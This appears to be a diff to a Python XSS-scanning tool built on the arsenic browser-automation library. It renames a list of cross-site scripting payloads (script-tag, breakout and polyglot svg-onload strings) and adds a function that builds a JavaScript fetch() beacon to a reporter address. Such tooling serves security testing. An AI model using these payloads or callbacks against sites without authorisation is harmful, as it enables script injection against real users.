@@ -2,7 +2,7 @@ import logging
 import asyncio
 from arsenic import get_session, services, browsers
 
-TEST_PAYLOADS = [
+XSS_PAYLOADS = [
     # Basic payloads
     "<script>%s</script>",
     '>"<script>%s</script>',
@@ -28,6 +28,11 @@ TEST_PAYLOADS = [
     # Polyglot
     "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
 ]
+
+
+def build_callback(callback_id):
+    payload = 'fetch("%s/callback?log=%d")' % (REPORTER_ADDR, callback_id)
+    return payload
 
 
 async def visit(config):
